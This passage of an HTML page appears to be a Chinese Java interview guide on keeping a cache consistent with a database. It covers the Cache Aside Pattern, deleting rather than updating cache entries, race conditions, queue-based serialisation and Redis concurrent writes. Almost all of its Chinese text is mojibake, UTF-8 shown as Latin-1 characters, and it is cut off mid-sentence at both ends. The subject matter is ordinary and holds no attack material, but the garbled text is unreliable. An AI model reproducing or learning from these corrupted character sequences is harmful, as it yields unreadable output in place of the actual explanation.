id="é¢è¯•é¢˜å‰–æ">é¢è¯•é¢˜å‰–æ</span></h2><p>ä¸€èˆ¬æ¥è¯´ï¼Œå¦‚æœå…è®¸ç¼“å­˜å¯ä»¥ç¨å¾®çš„è·Ÿæ•°æ®åº“å¶å°”æœ‰ä¸ä¸€è‡´çš„æƒ…å†µï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœä½ çš„ç³»ç»Ÿ<strong>ä¸æ˜¯ä¸¥æ ¼è¦æ±‚</strong> â€œç¼“å­˜+æ•°æ®åº“â€ å¿…é¡»ä¿æŒä¸€è‡´æ€§çš„è¯ï¼Œæœ€å¥½ä¸è¦åšè¿™ä¸ªæ–¹æ¡ˆï¼Œå³ï¼š<strong>è¯»è¯·æ±‚å’Œå†™è¯·æ±‚ä¸²è¡ŒåŒ–</strong>ï¼Œä¸²åˆ°ä¸€ä¸ª<strong>å†…å­˜é˜Ÿåˆ—</strong>é‡Œå»ã€‚</p><p>ä¸²è¡ŒåŒ–å¯ä»¥ä¿è¯ä¸€å®šä¸ä¼šå‡ºç°ä¸ä¸€è‡´çš„æƒ…å†µï¼Œä½†æ˜¯å®ƒä¹Ÿä¼šå¯¼è‡´ç³»ç»Ÿçš„ååé‡å¤§å¹…åº¦é™ä½ï¼Œç”¨æ¯”æ­£å¸¸æƒ…å†µä¸‹å¤šå‡ å€çš„æœºå™¨å»æ”¯æ’‘çº¿ä¸Šçš„ä¸€ä¸ªè¯·æ±‚ã€‚</p><h3><span id="cache-aside-pattern">Cache Aside Pattern</span></h3><p>æœ€ç»å…¸çš„ç¼“å­˜+æ•°æ®åº“è¯»å†™çš„æ¨¡å¼ï¼Œå°±æ˜¯ Cache Aside Patternã€‚</p><ul><li>è¯»çš„æ—¶å€™ï¼Œå…ˆè¯»ç¼“å­˜ï¼Œç¼“å­˜æ²¡æœ‰çš„è¯ï¼Œå°±è¯»æ•°æ®åº“ï¼Œç„¶åå–å‡ºæ•°æ®åæ”¾å…¥ç¼“å­˜ï¼ŒåŒæ—¶è¿”å›å“åº”ã€‚</li><li>æ›´æ–°çš„æ—¶å€™ï¼Œ<strong>å…ˆæ›´æ–°æ•°æ®åº“ï¼Œç„¶åå†åˆ é™¤ç¼“å­˜</strong>ã€‚</li></ul><p><strong>ä¸ºä»€ä¹ˆæ˜¯åˆ é™¤ç¼“å­˜ï¼Œè€Œä¸æ˜¯æ›´æ–°ç¼“å­˜ï¼Ÿ</strong></p><p>åŸå› å¾ˆç®€å•ï¼Œå¾ˆå¤šæ—¶å€™ï¼Œåœ¨å¤æ‚ç‚¹çš„ç¼“å­˜åœºæ™¯ï¼Œç¼“å­˜ä¸å•å•æ˜¯æ•°æ®åº“ä¸­ç›´æ¥å–å‡ºæ¥çš„å€¼ã€‚</p><p>æ¯”å¦‚å¯èƒ½æ›´æ–°äº†æŸä¸ªè¡¨çš„ä¸€ä¸ªå­—æ®µï¼Œç„¶åå…¶å¯¹åº”çš„ç¼“å­˜ï¼Œæ˜¯éœ€è¦æŸ¥è¯¢å¦å¤–ä¸¤ä¸ªè¡¨çš„æ•°æ®å¹¶è¿›è¡Œè¿ç®—ï¼Œæ‰èƒ½è®¡ç®—å‡ºç¼“å­˜æœ€æ–°çš„å€¼çš„ã€‚</p><p>å¦å¤–æ›´æ–°ç¼“å­˜çš„ä»£ä»·æœ‰æ—¶å€™æ˜¯å¾ˆé«˜çš„ã€‚æ˜¯ä¸æ˜¯è¯´ï¼Œæ¯æ¬¡ä¿®æ”¹æ•°æ®åº“çš„æ—¶å€™ï¼Œéƒ½ä¸€å®šè¦å°†å…¶å¯¹åº”çš„ç¼“å­˜æ›´æ–°ä¸€ä»½ï¼Ÿä¹Ÿè®¸æœ‰çš„åœºæ™¯æ˜¯è¿™æ ·ï¼Œä½†æ˜¯å¯¹äº<strong>æ¯”è¾ƒå¤æ‚çš„ç¼“å­˜æ•°æ®è®¡ç®—çš„åœºæ™¯</strong>ï¼Œå°±ä¸æ˜¯è¿™æ ·äº†ã€‚å¦‚æœä½ é¢‘ç¹ä¿®æ”¹ä¸€ä¸ªç¼“å­˜æ¶‰åŠçš„å¤šä¸ªè¡¨ï¼Œç¼“å­˜ä¹Ÿé¢‘ç¹æ›´æ–°ã€‚ä½†æ˜¯é—®é¢˜åœ¨äºï¼Œ<strong>è¿™ä¸ªç¼“å­˜åˆ°åº•ä¼šä¸ä¼šè¢«é¢‘ç¹è®¿é—®åˆ°ï¼Ÿ</strong></p><p>ä¸¾ä¸ªæ —å­ï¼Œä¸€ä¸ªç¼“å­˜æ¶‰åŠçš„è¡¨çš„å­—æ®µï¼Œåœ¨ 1 åˆ†é’Ÿå†…å°±ä¿®æ”¹äº† 20 æ¬¡ï¼Œæˆ–è€…æ˜¯ 100 æ¬¡ï¼Œé‚£ä¹ˆç¼“å­˜æ›´æ–° 20 æ¬¡ã€100 æ¬¡ï¼›ä½†æ˜¯è¿™ä¸ªç¼“å­˜åœ¨ 1 åˆ†é’Ÿå†…åªè¢«è¯»å–äº† 1 æ¬¡ï¼Œæœ‰<strong>å¤§é‡çš„å†·æ•°æ®</strong>ã€‚å®é™…ä¸Šï¼Œå¦‚æœä½ åªæ˜¯åˆ é™¤ç¼“å­˜çš„è¯ï¼Œé‚£ä¹ˆåœ¨ 1 åˆ†é’Ÿå†…ï¼Œè¿™ä¸ªç¼“å­˜ä¸è¿‡å°±é‡æ–°è®¡ç®—ä¸€æ¬¡è€Œå·²ï¼Œå¼€é”€å¤§å¹…åº¦é™ä½ã€‚<strong>ç”¨åˆ°ç¼“å­˜æ‰å»ç®—ç¼“å­˜ã€‚</strong></p><p>å…¶å®åˆ é™¤ç¼“å­˜ï¼Œè€Œä¸æ˜¯æ›´æ–°ç¼“å­˜ï¼Œå°±æ˜¯ä¸€ä¸ª lazy è®¡ç®—çš„æ€æƒ³ï¼Œä¸è¦æ¯æ¬¡éƒ½é‡æ–°åšå¤æ‚çš„è®¡ç®—ï¼Œä¸ç®¡å®ƒä¼šä¸ä¼šç”¨åˆ°ï¼Œè€Œæ˜¯è®©å®ƒåˆ°éœ€è¦è¢«ä½¿ç”¨çš„æ—¶å€™å†é‡æ–°è®¡ç®—ã€‚åƒ mybatisï¼Œhibernateï¼Œéƒ½æœ‰æ‡’åŠ è½½æ€æƒ³ã€‚æŸ¥è¯¢ä¸€ä¸ªéƒ¨é—¨ï¼Œéƒ¨é—¨å¸¦äº†ä¸€ä¸ªå‘˜å·¥çš„ listï¼Œæ²¡æœ‰å¿…è¦è¯´æ¯æ¬¡æŸ¥è¯¢éƒ¨é—¨ï¼Œéƒ½æŠŠé‡Œé¢çš„ 1000 ä¸ªå‘˜å·¥çš„æ•°æ®ä¹ŸåŒæ—¶æŸ¥å‡ºæ¥å•Šã€‚80% çš„æƒ…å†µï¼ŒæŸ¥è¿™ä¸ªéƒ¨é—¨ï¼Œå°±åªæ˜¯è¦è®¿é—®è¿™ä¸ªéƒ¨é—¨çš„ä¿¡æ¯å°±å¯ä»¥äº†ã€‚å…ˆæŸ¥éƒ¨é—¨ï¼ŒåŒæ—¶è¦è®¿é—®é‡Œé¢çš„å‘˜å·¥ï¼Œé‚£ä¹ˆè¿™ä¸ªæ—¶å€™åªæœ‰åœ¨ä½ è¦è®¿é—®é‡Œé¢çš„å‘˜å·¥çš„æ—¶å€™ï¼Œæ‰ä¼šå»æ•°æ®åº“é‡Œé¢æŸ¥è¯¢ 1000 ä¸ªå‘˜å·¥ã€‚</p><h3><span id="æœ€åˆçº§çš„ç¼“å­˜ä¸ä¸€è‡´é—®é¢˜åŠè§£å†³æ–¹æ¡ˆ">æœ€åˆçº§çš„ç¼“å­˜ä¸ä¸€è‡´é—®é¢˜åŠè§£å†³æ–¹æ¡ˆ</span></h3><p>é—®é¢˜ï¼šå…ˆæ›´æ–°æ•°æ®åº“ï¼Œå†åˆ é™¤ç¼“å­˜ã€‚å¦‚æœåˆ é™¤ç¼“å­˜å¤±è´¥äº†ï¼Œé‚£ä¹ˆä¼šå¯¼è‡´æ•°æ®åº“ä¸­æ˜¯æ–°æ•°æ®ï¼Œç¼“å­˜ä¸­æ˜¯æ—§æ•°æ®ï¼Œæ•°æ®å°±å‡ºç°äº†ä¸ä¸€è‡´ã€‚</p><p><img src="https://github.com/Disda-coding/advanced-java/raw/master/images/redis-junior-inconsistent.png" alt="redis-junior-inconsistent"></p><p>è§£å†³æ€è·¯ï¼šå…ˆåˆ é™¤ç¼“å­˜ï¼Œå†æ›´æ–°æ•°æ®åº“ã€‚å¦‚æœæ•°æ®åº“æ›´æ–°å¤±è´¥äº†ï¼Œé‚£ä¹ˆæ•°æ®åº“ä¸­æ˜¯æ—§æ•°æ®ï¼Œç¼“å­˜ä¸­æ˜¯ç©ºçš„ï¼Œé‚£ä¹ˆæ•°æ®ä¸ä¼šä¸ä¸€è‡´ã€‚å› ä¸ºè¯»çš„æ—¶å€™ç¼“å­˜æ²¡æœ‰ï¼Œæ‰€ä»¥å»è¯»äº†æ•°æ®åº“ä¸­çš„æ—§æ•°æ®ï¼Œç„¶åæ›´æ–°åˆ°ç¼“å­˜ä¸­ã€‚</p><h3><span id="æ¯”è¾ƒå¤æ‚çš„æ•°æ®ä¸ä¸€è‡´é—®é¢˜åˆ†æ">æ¯”è¾ƒå¤æ‚çš„æ•°æ®ä¸ä¸€è‡´é—®é¢˜åˆ†æ</span></h3><p>æ•°æ®å‘ç”Ÿäº†å˜æ›´ï¼Œå…ˆåˆ é™¤äº†ç¼“å­˜ï¼Œç„¶åè¦å»ä¿®æ”¹æ•°æ®åº“ï¼Œæ­¤æ—¶è¿˜æ²¡ä¿®æ”¹ã€‚ä¸€ä¸ªè¯·æ±‚è¿‡æ¥ï¼Œå»è¯»ç¼“å­˜ï¼Œå‘ç°ç¼“å­˜ç©ºäº†ï¼Œå»æŸ¥è¯¢æ•°æ®åº“ï¼Œ<strong>æŸ¥åˆ°äº†ä¿®æ”¹å‰çš„æ—§æ•°æ®</strong>ï¼Œæ”¾åˆ°äº†ç¼“å­˜ä¸­ã€‚éšåæ•°æ®å˜æ›´çš„ç¨‹åºå®Œæˆäº†æ•°æ®åº“çš„ä¿®æ”¹ã€‚å®Œäº†ï¼Œæ•°æ®åº“å’Œç¼“å­˜ä¸­çš„æ•°æ®ä¸ä¸€æ ·äº†â€¦</p><p><strong>ä¸ºä»€ä¹ˆä¸Šäº¿æµé‡é«˜å¹¶å‘åœºæ™¯ä¸‹ï¼Œç¼“å­˜ä¼šå‡ºç°è¿™ä¸ªé—®é¢˜ï¼Ÿ</strong></p><p>åªæœ‰åœ¨å¯¹ä¸€ä¸ªæ•°æ®åœ¨å¹¶å‘çš„è¿›è¡Œè¯»å†™çš„æ—¶å€™ï¼Œæ‰å¯èƒ½ä¼šå‡ºç°è¿™ç§é—®é¢˜ã€‚å…¶å®å¦‚æœè¯´ä½ çš„å¹¶å‘é‡å¾ˆä½çš„è¯ï¼Œç‰¹åˆ«æ˜¯è¯»å¹¶å‘å¾ˆä½ï¼Œæ¯å¤©è®¿é—®é‡å°± 1 ä¸‡æ¬¡ï¼Œé‚£ä¹ˆå¾ˆå°‘çš„æƒ…å†µä¸‹ï¼Œä¼šå‡ºç°åˆšæ‰æè¿°çš„é‚£ç§ä¸ä¸€è‡´çš„åœºæ™¯ã€‚ä½†æ˜¯é—®é¢˜æ˜¯ï¼Œå¦‚æœæ¯å¤©çš„æ˜¯ä¸Šäº¿çš„æµé‡ï¼Œæ¯ç§’å¹¶å‘è¯»æ˜¯å‡ ä¸‡ï¼Œæ¯ç§’åªè¦æœ‰æ•°æ®æ›´æ–°çš„è¯·æ±‚ï¼Œå°±<strong>å¯èƒ½ä¼šå‡ºç°ä¸Šè¿°çš„æ•°æ®åº“+ç¼“å­˜ä¸ä¸€è‡´çš„æƒ…å†µ</strong>ã€‚</p><p><strong>è§£å†³æ–¹æ¡ˆå¦‚ä¸‹ï¼š</strong></p><p>æ›´æ–°æ•°æ®çš„æ—¶å€™ï¼Œæ ¹æ®<strong>æ•°æ®çš„å”¯ä¸€æ ‡è¯†</strong>ï¼Œå°†æ“ä½œè·¯ç”±ä¹‹åï¼Œå‘é€åˆ°ä¸€ä¸ª jvm å†…éƒ¨é˜Ÿåˆ—ä¸­ã€‚è¯»å–æ•°æ®çš„æ—¶å€™ï¼Œå¦‚æœå‘ç°æ•°æ®ä¸åœ¨ç¼“å­˜ä¸­ï¼Œé‚£ä¹ˆå°†é‡æ–°æ‰§è¡Œâ€œè¯»å–æ•°æ®+æ›´æ–°ç¼“å­˜â€çš„æ“ä½œï¼Œæ ¹æ®å”¯ä¸€æ ‡è¯†è·¯ç”±ä¹‹åï¼Œä¹Ÿå‘é€åˆ°åŒä¸€ä¸ª jvm å†…éƒ¨é˜Ÿåˆ—ä¸­ã€‚</p><p>ä¸€ä¸ªé˜Ÿåˆ—å¯¹åº”ä¸€ä¸ªå·¥ä½œçº¿ç¨‹ï¼Œæ¯ä¸ªå·¥ä½œçº¿ç¨‹<strong>ä¸²è¡Œ</strong>æ‹¿åˆ°å¯¹åº”çš„æ“ä½œï¼Œç„¶åä¸€æ¡ä¸€æ¡çš„æ‰§è¡Œã€‚è¿™æ ·çš„è¯ï¼Œä¸€ä¸ªæ•°æ®å˜æ›´çš„æ“ä½œï¼Œå…ˆåˆ é™¤ç¼“å­˜ï¼Œç„¶åå†å»æ›´æ–°æ•°æ®åº“ï¼Œä½†æ˜¯è¿˜æ²¡å®Œæˆæ›´æ–°ã€‚æ­¤æ—¶å¦‚æœä¸€ä¸ªè¯»è¯·æ±‚è¿‡æ¥ï¼Œæ²¡æœ‰è¯»åˆ°ç¼“å­˜ï¼Œé‚£ä¹ˆå¯ä»¥å…ˆå°†ç¼“å­˜æ›´æ–°çš„è¯·æ±‚å‘é€åˆ°é˜Ÿåˆ—ä¸­ï¼Œæ­¤æ—¶ä¼šåœ¨é˜Ÿåˆ—ä¸­ç§¯å‹ï¼Œç„¶ååŒæ­¥ç­‰å¾…ç¼“å­˜æ›´æ–°å®Œæˆã€‚</p><p>è¿™é‡Œæœ‰ä¸€ä¸ª<strong>ä¼˜åŒ–ç‚¹</strong>ï¼Œä¸€ä¸ªé˜Ÿåˆ—ä¸­ï¼Œå…¶å®<strong>å¤šä¸ªæ›´æ–°ç¼“å­˜è¯·æ±‚ä¸²åœ¨ä¸€èµ·æ˜¯æ²¡æ„ä¹‰çš„</strong>ï¼Œå› æ­¤å¯ä»¥åšè¿‡æ»¤ï¼Œå¦‚æœå‘ç°é˜Ÿåˆ—ä¸­å·²ç»æœ‰ä¸€ä¸ªæ›´æ–°ç¼“å­˜çš„è¯·æ±‚äº†ï¼Œé‚£ä¹ˆå°±ä¸ç”¨å†æ”¾ä¸ªæ›´æ–°è¯·æ±‚æ“ä½œè¿›å»äº†ï¼Œç›´æ¥ç­‰å¾…å‰é¢çš„æ›´æ–°æ“ä½œè¯·æ±‚å®Œæˆå³å¯ã€‚</p><p>å¾…é‚£ä¸ªé˜Ÿåˆ—å¯¹åº”çš„å·¥ä½œçº¿ç¨‹å®Œæˆäº†ä¸Šä¸€ä¸ªæ“ä½œçš„æ•°æ®åº“çš„ä¿®æ”¹ä¹‹åï¼Œæ‰ä¼šå»æ‰§è¡Œä¸‹ä¸€ä¸ªæ“ä½œï¼Œä¹Ÿå°±æ˜¯ç¼“å­˜æ›´æ–°çš„æ“ä½œï¼Œæ­¤æ—¶ä¼šä»æ•°æ®åº“ä¸­è¯»å–æœ€æ–°çš„å€¼ï¼Œç„¶åå†™å…¥ç¼“å­˜ä¸­ã€‚</p><p>å¦‚æœè¯·æ±‚è¿˜åœ¨ç­‰å¾…æ—¶é—´èŒƒå›´å†…ï¼Œä¸æ–­è½®è¯¢å‘ç°å¯ä»¥å–åˆ°å€¼äº†ï¼Œé‚£ä¹ˆå°±ç›´æ¥è¿”å›ï¼›å¦‚æœè¯·æ±‚ç­‰å¾…çš„æ—¶é—´è¶…è¿‡ä¸€å®šæ—¶é•¿ï¼Œé‚£ä¹ˆè¿™ä¸€æ¬¡ç›´æ¥ä»æ•°æ®åº“ä¸­è¯»å–å½“å‰çš„æ—§å€¼ã€‚</p><p>é«˜å¹¶å‘çš„åœºæ™¯ä¸‹ï¼Œè¯¥è§£å†³æ–¹æ¡ˆè¦æ³¨æ„çš„é—®é¢˜ï¼š</p><ul><li>è¯»è¯·æ±‚é•¿æ—¶é˜»å¡</li></ul><p>ç”±äºè¯»è¯·æ±‚è¿›è¡Œäº†éå¸¸è½»åº¦çš„å¼‚æ­¥åŒ–ï¼Œæ‰€ä»¥ä¸€å®šè¦æ³¨æ„è¯»è¶…æ—¶çš„é—®é¢˜ï¼Œæ¯ä¸ªè¯»è¯·æ±‚å¿…é¡»åœ¨è¶…æ—¶æ—¶é—´èŒƒå›´å†…è¿”å›ã€‚</p><p>è¯¥è§£å†³æ–¹æ¡ˆï¼Œæœ€å¤§çš„é£é™©ç‚¹åœ¨äºè¯´ï¼Œ<strong>å¯èƒ½æ•°æ®æ›´æ–°å¾ˆé¢‘ç¹</strong>ï¼Œå¯¼è‡´é˜Ÿåˆ—ä¸­ç§¯å‹äº†å¤§é‡æ›´æ–°æ“ä½œåœ¨é‡Œé¢ï¼Œç„¶å<strong>è¯»è¯·æ±‚ä¼šå‘ç”Ÿå¤§é‡çš„è¶…æ—¶</strong>ï¼Œæœ€åå¯¼è‡´å¤§é‡çš„è¯·æ±‚ç›´æ¥èµ°æ•°æ®åº“ã€‚åŠ¡å¿…é€šè¿‡ä¸€äº›æ¨¡æ‹ŸçœŸå®çš„æµ‹è¯•ï¼Œçœ‹çœ‹æ›´æ–°æ•°æ®çš„é¢‘ç‡æ˜¯æ€æ ·çš„ã€‚</p><p>å¦å¤–ä¸€ç‚¹ï¼Œå› ä¸ºä¸€ä¸ªé˜Ÿåˆ—ä¸­ï¼Œå¯èƒ½ä¼šç§¯å‹é’ˆå¯¹å¤šä¸ªæ•°æ®é¡¹çš„æ›´æ–°æ“ä½œï¼Œå› æ­¤éœ€è¦æ ¹æ®è‡ªå·±çš„ä¸šåŠ¡æƒ…å†µè¿›è¡Œæµ‹è¯•ï¼Œå¯èƒ½éœ€è¦<strong>éƒ¨ç½²å¤šä¸ªæœåŠ¡</strong>ï¼Œæ¯ä¸ªæœåŠ¡åˆ†æ‘Šä¸€äº›æ•°æ®çš„æ›´æ–°æ“ä½œã€‚å¦‚æœä¸€ä¸ªå†…å­˜é˜Ÿåˆ—é‡Œå±…ç„¶ä¼šæŒ¤å‹ 100 ä¸ªå•†å“çš„åº“å­˜ä¿®æ”¹æ“ä½œï¼Œæ¯ä¸ªåº“å­˜ä¿®æ”¹æ“ä½œè¦è€—è´¹ 10ms å»å®Œæˆï¼Œé‚£ä¹ˆæœ€åä¸€ä¸ªå•†å“çš„è¯»è¯·æ±‚ï¼Œå¯èƒ½ç­‰å¾… 10 * 100 &#x3D; 1000ms &#x3D; 1s åï¼Œæ‰èƒ½å¾—åˆ°æ•°æ®ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯¼è‡´<strong>è¯»è¯·æ±‚çš„é•¿æ—¶é˜»å¡</strong>ã€‚</p><p>ä¸€å®šè¦åšæ ¹æ®å®é™…ä¸šåŠ¡ç³»ç»Ÿçš„è¿è¡Œæƒ…å†µï¼Œå»è¿›è¡Œä¸€äº›å‹åŠ›æµ‹è¯•ï¼Œå’Œæ¨¡æ‹Ÿçº¿ä¸Šç¯å¢ƒï¼Œå»çœ‹çœ‹æœ€ç¹å¿™çš„æ—¶å€™ï¼Œå†…å­˜é˜Ÿåˆ—å¯èƒ½ä¼šæŒ¤å‹å¤šå°‘æ›´æ–°æ“ä½œï¼Œå¯èƒ½ä¼šå¯¼è‡´æœ€åä¸€ä¸ªæ›´æ–°æ“ä½œå¯¹åº”çš„è¯»è¯·æ±‚ï¼Œä¼š hang å¤šå°‘æ—¶é—´ï¼Œå¦‚æœè¯»è¯·æ±‚åœ¨ 200ms è¿”å›ï¼Œå¦‚æœä½ è®¡ç®—è¿‡åï¼Œå“ªæ€•æ˜¯æœ€ç¹å¿™çš„æ—¶å€™ï¼Œç§¯å‹ 10 ä¸ªæ›´æ–°æ“ä½œï¼Œæœ€å¤šç­‰å¾… 200msï¼Œé‚£è¿˜å¯ä»¥çš„ã€‚</p><p><strong>å¦‚æœä¸€ä¸ªå†…å­˜é˜Ÿåˆ—ä¸­å¯èƒ½ç§¯å‹çš„æ›´æ–°æ“ä½œç‰¹åˆ«å¤š</strong>ï¼Œé‚£ä¹ˆä½ å°±è¦<strong>åŠ æœºå™¨</strong>ï¼Œè®©æ¯ä¸ªæœºå™¨ä¸Šéƒ¨ç½²çš„æœåŠ¡å®ä¾‹å¤„ç†æ›´å°‘çš„æ•°æ®ï¼Œé‚£ä¹ˆæ¯ä¸ªå†…å­˜é˜Ÿåˆ—ä¸­ç§¯å‹çš„æ›´æ–°æ“ä½œå°±ä¼šè¶Šå°‘ã€‚</p><p>å…¶å®æ ¹æ®ä¹‹å‰çš„é¡¹ç›®ç»éªŒï¼Œä¸€èˆ¬æ¥è¯´ï¼Œæ•°æ®çš„å†™é¢‘ç‡æ˜¯å¾ˆä½çš„ï¼Œå› æ­¤å®é™…ä¸Šæ­£å¸¸æ¥è¯´ï¼Œåœ¨é˜Ÿåˆ—ä¸­ç§¯å‹çš„æ›´æ–°æ“ä½œåº”è¯¥æ˜¯å¾ˆå°‘çš„ã€‚åƒè¿™ç§é’ˆå¯¹è¯»é«˜å¹¶å‘ã€è¯»ç¼“å­˜æ¶æ„çš„é¡¹ç›®ï¼Œä¸€èˆ¬æ¥è¯´å†™è¯·æ±‚æ˜¯éå¸¸å°‘çš„ï¼Œæ¯ç§’çš„ QPS èƒ½åˆ°å‡ ç™¾å°±ä¸é”™äº†ã€‚</p><p>æˆ‘ä»¬æ¥<strong>å®é™…ç²—ç•¥æµ‹ç®—ä¸€ä¸‹</strong>ã€‚</p><p>å¦‚æœä¸€ç§’æœ‰ 500 çš„å†™æ“ä½œï¼Œå¦‚æœåˆ†æˆ 5 ä¸ªæ—¶é—´ç‰‡ï¼Œæ¯ 200ms å°± 100 ä¸ªå†™æ“ä½œï¼Œæ”¾åˆ° 20 ä¸ªå†…å­˜é˜Ÿåˆ—ä¸­ï¼Œæ¯ä¸ªå†…å­˜é˜Ÿåˆ—ï¼Œå¯èƒ½å°±ç§¯å‹ 5 ä¸ªå†™æ“ä½œã€‚æ¯ä¸ªå†™æ“ä½œæ€§èƒ½æµ‹è¯•åï¼Œä¸€èˆ¬æ˜¯åœ¨ 20ms å·¦å³å°±å®Œæˆï¼Œé‚£ä¹ˆé’ˆå¯¹æ¯ä¸ªå†…å­˜é˜Ÿåˆ—çš„æ•°æ®çš„è¯»è¯·æ±‚ï¼Œä¹Ÿå°±æœ€å¤š hang ä¸€ä¼šå„¿ï¼Œ200ms ä»¥å†…è‚¯å®šèƒ½è¿”å›äº†ã€‚</p><p>ç»è¿‡åˆšæ‰ç®€å•çš„æµ‹ç®—ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œå•æœºæ”¯æ’‘çš„å†™ QPS åœ¨å‡ ç™¾æ˜¯æ²¡é—®é¢˜çš„ï¼Œå¦‚æœå†™ QPS æ‰©å¤§äº† 10 å€ï¼Œé‚£ä¹ˆå°±æ‰©å®¹æœºå™¨ï¼Œæ‰©å®¹ 10 å€çš„æœºå™¨ï¼Œæ¯ä¸ªæœºå™¨ 20 ä¸ªé˜Ÿåˆ—ã€‚</p><ul><li>è¯»è¯·æ±‚å¹¶å‘é‡è¿‡é«˜</li></ul><p>è¿™é‡Œè¿˜å¿…é¡»åšå¥½å‹åŠ›æµ‹è¯•ï¼Œç¡®ä¿æ°å·§ç¢°ä¸Šä¸Šè¿°æƒ…å†µçš„æ—¶å€™ï¼Œè¿˜æœ‰ä¸€ä¸ªé£é™©ï¼Œå°±æ˜¯çªç„¶é—´å¤§é‡è¯»è¯·æ±‚ä¼šåœ¨å‡ åæ¯«ç§’çš„å»¶æ—¶ hang åœ¨æœåŠ¡ä¸Šï¼Œçœ‹æœåŠ¡èƒ½ä¸èƒ½æ‰›çš„ä½ï¼Œéœ€è¦å¤šå°‘æœºå™¨æ‰èƒ½æ‰›ä½æœ€å¤§çš„æé™æƒ…å†µçš„å³°å€¼ã€‚</p><p>ä½†æ˜¯å› ä¸ºå¹¶ä¸æ˜¯æ‰€æœ‰çš„æ•°æ®éƒ½åœ¨åŒä¸€æ—¶é—´æ›´æ–°ï¼Œç¼“å­˜ä¹Ÿä¸ä¼šåŒä¸€æ—¶é—´å¤±æ•ˆï¼Œæ‰€ä»¥æ¯æ¬¡å¯èƒ½ä¹Ÿå°±æ˜¯å°‘æ•°æ•°æ®çš„ç¼“å­˜å¤±æ•ˆäº†ï¼Œç„¶åé‚£äº›æ•°æ®å¯¹åº”çš„è¯»è¯·æ±‚è¿‡æ¥ï¼Œå¹¶å‘é‡åº”è¯¥ä¹Ÿä¸ä¼šç‰¹åˆ«å¤§ã€‚</p><ul><li>å¤šæœåŠ¡å®ä¾‹éƒ¨ç½²çš„è¯·æ±‚è·¯ç”±</li></ul><p>å¯èƒ½è¿™ä¸ªæœåŠ¡éƒ¨ç½²äº†å¤šä¸ªå®ä¾‹ï¼Œé‚£ä¹ˆå¿…é¡»<strong>ä¿è¯</strong>è¯´ï¼Œæ‰§è¡Œæ•°æ®æ›´æ–°æ“ä½œï¼Œä»¥åŠæ‰§è¡Œç¼“å­˜æ›´æ–°æ“ä½œçš„è¯·æ±‚ï¼Œéƒ½é€šè¿‡ Nginx æœåŠ¡å™¨<strong>è·¯ç”±åˆ°ç›¸åŒçš„æœåŠ¡å®ä¾‹ä¸Š</strong>ã€‚</p><p>æ¯”å¦‚è¯´ï¼Œå¯¹åŒä¸€ä¸ªå•†å“çš„è¯»å†™è¯·æ±‚ï¼Œå…¨éƒ¨è·¯ç”±åˆ°åŒä¸€å°æœºå™¨ä¸Šã€‚å¯ä»¥è‡ªå·±å»åšæœåŠ¡é—´çš„æŒ‰ç…§æŸä¸ªè¯·æ±‚å‚æ•°çš„ hash è·¯ç”±ï¼Œä¹Ÿå¯ä»¥ç”¨ Nginx çš„ hash è·¯ç”±åŠŸèƒ½ç­‰ç­‰ã€‚</p><ul><li>çƒ­ç‚¹å•†å“çš„è·¯ç”±é—®é¢˜ï¼Œå¯¼è‡´è¯·æ±‚çš„å€¾æ–œ</li></ul><p>ä¸‡ä¸€æŸä¸ªå•†å“çš„è¯»å†™è¯·æ±‚ç‰¹åˆ«é«˜ï¼Œå…¨éƒ¨æ‰“åˆ°ç›¸åŒçš„æœºå™¨çš„ç›¸åŒçš„é˜Ÿåˆ—é‡Œé¢å»äº†ï¼Œå¯èƒ½ä¼šé€ æˆæŸå°æœºå™¨çš„å‹åŠ›è¿‡å¤§ã€‚å°±æ˜¯è¯´ï¼Œå› ä¸ºåªæœ‰åœ¨å•†å“æ•°æ®æ›´æ–°çš„æ—¶å€™æ‰ä¼šæ¸…ç©ºç¼“å­˜ï¼Œç„¶åæ‰ä¼šå¯¼è‡´è¯»å†™å¹¶å‘ï¼Œæ‰€ä»¥å…¶å®è¦æ ¹æ®ä¸šåŠ¡ç³»ç»Ÿå»çœ‹ï¼Œå¦‚æœæ›´æ–°é¢‘ç‡ä¸æ˜¯å¤ªé«˜çš„è¯ï¼Œè¿™ä¸ªé—®é¢˜çš„å½±å“å¹¶ä¸æ˜¯ç‰¹åˆ«å¤§ï¼Œä½†æ˜¯çš„ç¡®å¯èƒ½æŸäº›æœºå™¨çš„è´Ÿè½½ä¼šé«˜ä¸€äº›ã€‚</p><h1><span id="redis-çš„å¹¶å‘ç«äº‰é—®é¢˜æ˜¯ä»€ä¹ˆå¦‚ä½•è§£å†³è¿™ä¸ªé—®é¢˜äº†è§£-redis-äº‹åŠ¡çš„-cas-æ–¹æ¡ˆå—">redis çš„å¹¶å‘ç«äº‰é—®é¢˜æ˜¯ä»€ä¹ˆï¼Ÿå¦‚ä½•è§£å†³è¿™ä¸ªé—®é¢˜ï¼Ÿäº†è§£ redis äº‹åŠ¡çš„ CAS æ–¹æ¡ˆå—ï¼Ÿ</span></h1><h2><span id="é¢è¯•å®˜å¿ƒç†åˆ†æ">é¢è¯•å®˜å¿ƒç†åˆ†æ</span></h2><p>è¿™ä¸ªä¹Ÿæ˜¯çº¿ä¸Šéå¸¸å¸¸è§çš„ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯<strong>å¤šå®¢æˆ·ç«¯åŒæ—¶å¹¶å‘å†™</strong>ä¸€ä¸ª keyï¼Œå¯èƒ½æœ¬æ¥åº”è¯¥å…ˆåˆ°çš„æ•°æ®ååˆ°äº†ï¼Œå¯¼è‡´æ•°æ®ç‰ˆæœ¬é”™äº†ï¼›æˆ–è€…æ˜¯å¤šå®¢æˆ·ç«¯åŒæ—¶è·å–ä¸€ä¸ª keyï¼Œä¿®æ”¹å€¼ä¹‹åå†å†™å›å»ï¼Œåªè¦é¡ºåºé”™äº†ï¼Œæ•°æ®å°±é”™äº†ã€‚</p><p>è€Œä¸” redis è‡ªå·±å°±æœ‰å¤©ç„¶è§£å†³è¿™ä¸ªé—®é¢˜çš„ CAS ç±»çš„ä¹è§‚é”æ–¹æ¡ˆã€‚</p><h2><span id="é¢è¯•é¢˜å‰–æ">é¢è¯•é¢˜å‰–æ</span></h2><p>æŸä¸ªæ—¶åˆ»ï¼Œå¤šä¸ªç³»ç»Ÿå®ä¾‹éƒ½å»æ›´æ–°æŸä¸ª keyã€‚å¯ä»¥åŸºäº zookeeper å®ç°åˆ†å¸ƒå¼é”ã€‚æ¯ä¸ªç³»ç»Ÿé€šè¿‡ 